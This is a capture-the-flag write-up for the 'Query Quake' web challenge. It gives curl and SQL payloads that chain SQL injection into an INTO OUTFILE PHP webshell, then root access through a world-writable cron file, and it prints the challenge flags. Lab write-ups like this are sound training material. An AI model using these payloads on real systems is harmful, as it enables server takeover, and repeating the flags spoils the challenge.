---
title: "Query Quake — CTF Writeup"
date: 2026-03-13
categories:
  - Misc
tags:
  - Misc
  - HackerDNA
collections:
  - HackerDNA
---



{{< admonition tldr "TL;DR" >}}

**Query Quake — CTF Writeup** is a misc challenge from **HackerDNA**. | Categories | Difficulty | Tags | | ---------------- | ---------- | ----------- | | Web Exploitation | Medium | MYSQLI, RCE |

{{< /admonition >}}

## Challenge Information

| Categories | Difficulty | Tags |
| ---------------- | ---------- | ----------- |
| Web Exploitation | Medium | MYSQLI, RCE |

---

# Overview

The **Query Quake** challenge involves exploiting a vulnerable web administration panel that suffers from **SQL Injection**. By leveraging this vulnerability, it is possible to write a **PHP webshell** to the web server using the MySQL `INTO OUTFILE` feature.

After gaining **Remote Command Execution (RCE)** as the `www-data` user, further enumeration reveals a **misconfigured cron file** that is writable by non-privileged users. By injecting commands into this cron file, it becomes possible to escalate privileges to **root** and retrieve the final flag.

---

# Attack Chain

```
SQL Injection
    ↓
UNION SELECT
    ↓
Write Webshell (INTO OUTFILE)
    ↓
Remote Command Execution (www-data)
    ↓
Enumerate Writable Files
    ↓
Cron Misconfiguration
    ↓
Privilege Escalation
    ↓
Root Flag
```

---

# Step 1 — Identifying SQL Injection

The `/webadmin/index.php` endpoint accepts POST parameters:

```
username
password
```

Testing the `username` parameter reveals that the query is vulnerable to SQL Injection.

Example test payload:

```sql
' ORDER BY 1-- -
```

Error responses confirmed that the application executes a query similar to:

```sql
SELECT * FROM admin WHERE username='$username' AND password='$password';
```

---

# Step 2 — Determining Column Count

Using a UNION based attack we determine the number of columns.

Example payload:

```sql
' UNION SELECT 1,2-- -
```

The query accepts **two columns**.

---

# Step 3 — Writing a Webshell

MySQL allows writing files using the `INTO OUTFILE` directive. This can be abused to write a **PHP webshell** into the webroot.

Exploit payload:

```bash
curl -X POST http://TARGET/webadmin/index.php \
--data-urlencode "username=' UNION SELECT \"<?php system(\$_GET['cmd']); ?>\",2 INTO OUTFILE '/var/www/html/shell.php'-- -" \
-d "password=test"
```

This writes the following files:

```php
<?php system($_GET['cmd']); ?>
```

Location:

```
/var/www/html/shell.php
```

---

# Step 4 — Remote Command Execution

Access the webshell:

```
http://TARGET/shell.php?cmd=id
```

Result:

```
uid=33(www-data) gid=33(www-data)
```

The attacker now has **command execution as the `www-data` user**.

---

# Step 5 — Enumerating the System

Search for writable files:

```bash
find / -writable -type f 2>/dev/null
```

A suspicious file appears:

```
/supervisord.cron
```

Checking permissions:

```bash
ls -la /supervisord.cron
```

Result:

```
-rwx-wx-wx 1 root root 73 May 30 /supervisord.cron
```

This means:

* Owned by **root**
* **Writable by everyone**

This strongly indicates a **cron job executed as root**.

---

# Step 6 — Privilege Escalation

Since the file is writable, we can inject commands into it.

Payloads:

```bash
echo cp /root/flag-root.txt /var/www/html/root.txt > /supervisord.cron
```

Using the webshell:

```bash
curl "http://TARGET/shell.php?cmd=echo%20cp%20/root/flag-root.txt%20/var/www/html/root.txt%20>%20/supervisord.cron"
```

When the cron job executes, the command runs as **root**.

---

# Step 7 — Retrieving the Root Flag

After waiting for the cron job to execute:

```
http://TARGET/root.txt
```

Root flags:

```
ff03e1cd-d95e-46be-bbb8-15c19e3675cc
```

---

# Flags

### User Flags

```
67e43227-faa1-44a8-8286-ddabb9ac7275
```

### Root Flag

```
ff03e1cd-d95e-46be-bbb8-15c19e3675cc
```

---

# Vulnerabilities Identified

1. **SQL Injection (MYSQLI)**
2. **Arbitrary File Write via MySQL `INTO OUTFILE` **
3. **Remote Command Execution**
4. **World-Writable Cron Script**
5. **Privilege Escalation to Root**

---

# Key Takeaways

This challenge demonstrates how multiple vulnerabilities can chain together:

* A **SQL Injection** can lead to **arbitrary file writes**
* This enables **webshell deployment**
* With system access, misconfigurations like **world-writable cron files** can lead to **full root compromise**

Proper mitigation includes:

* Using **prepared statements**
* Disabling `INTO OUTFILE` * Restricting file system permissions
* Avoiding world-written cron scripts

---

# Final Thoughts

The **Query Quake** challenge is an excellent example of how web vulnerabilities can escalate into full system compromise. The attack chain highlights the importance of secure coding practices and proper system configuration.

---

**Author:** spawntopwn
**Challenge:** Query Quake
**Platform:** hackerdna CTF
